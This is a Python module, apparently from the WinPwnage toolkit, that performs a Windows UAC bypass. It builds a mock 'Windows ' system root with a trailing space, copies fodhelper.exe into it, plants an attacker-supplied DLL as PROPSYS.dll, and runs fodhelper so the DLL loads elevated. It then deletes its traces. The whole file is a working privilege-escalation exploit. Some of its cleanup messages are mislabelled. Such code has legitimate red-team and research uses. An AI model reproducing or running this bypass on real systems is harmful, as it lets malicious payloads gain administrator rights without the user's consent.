import os
import time
import shutil
from winpwnage.core.prints import *
from winpwnage.core.utils import *

# https://github.com/tenable/poc/blob/master/Microsoft/Windows/UACBypass/UACBypass.cpp

mock_info = {
	"Description": "Bypass UAC using mock systemroot directory (dll payload)",
	"Id": "19",
	"Type": "UAC bypass",
	"Fixed In": "9999999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uac_mockdir",
	"Function Payload": True,
}

# Manual cleaning:
# rmdir "C:\\Windows \\system32" /Q /S && rmdir "C:\\Windows \\"

def uac_mockdir(payload):
	if payloads().dll(payload):
		dirs = [os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\"),
				os.path.join(information().windows_directory().lower().strip("windows"),"Windows \\system32")]

		for d in dirs:
			try:
				os.mkdir(d)
			except OSError:
				print_warning("Directory already exists ({path}) using existing one".format(path=d))
			except Exception as error:
				print_error("Unable to create mock SystemRoot directory ({error})".format(error=error))
			else:
				print_success("Successfully created mock SystemRoot directory ({path})".format(path=d))

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			try:
				shutil.copyfile(os.path.join(information().system_directory(), "fodhelper.exe"), os.path.join(dirs[1], "fodhelper.exe"))
			except Exception as error:
				print_error("Unable to copy MS binary to mock SystemRoot directory")
			else:
				print_success("Successfully copied MS binary to mock SystemRoot directory")

		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception:
			print_error("Unable to read payload data")

		try:
			dll_file = open(os.path.join(dirs[1], "PROPSYS.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception:
			print_error("Unable to write payload to mock SystemRoot directory")
		else:
			print_success("Successfully wrote payload to mock SystemRoot directory")

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create(os.path.join(dirs[1], "fodhelper.exe"), window=True, get_exit_code=False):
				print_success("Successfully executed fodhelper inside mock SystemRoot directory")
			else:
				print_error("Unable to execute fodhelper inside mock SystemRoot directory")

		"""
		Cleaning cannot be done unless the process exits and dll gets unloaded
		"""
		print_info("Performing cleaning")
		try:
			os.remove(os.path.join(dirs[1], "fodhelper.exe"))
		except Exception as error:
			print_warning("Unable to delete MS binary from mock SystemRoot directory")
		else:
			print_success("Successfully deleted MS binary from mock SystemRoot directory")

		time.sleep(2)

		try:
			os.remove(os.path.join(dirs[1], "PROPSYS.dll"))
		except Exception as error:
			print_warning("Unable to delete payload from mock SystemRoot directory")
		else:
			print_success("Successfully deleted MS binary from mock SystemRoot directory")

		time.sleep(2)

		try:
			shutil.rmtree(dirs[1])
		except Exception as error:
			print_warning("Unable to delete mock System32 directory tree")
		else:
			print_success("Successfully deleted mock System32 directory tree")
			
		try:
			shutil.rmtree(dirs[0])
		except Exception as error:
			print_warning("Unable to delete mock Windows directory tree")
		else:
			print_success("Successfully deleted mock System32 directory tree")			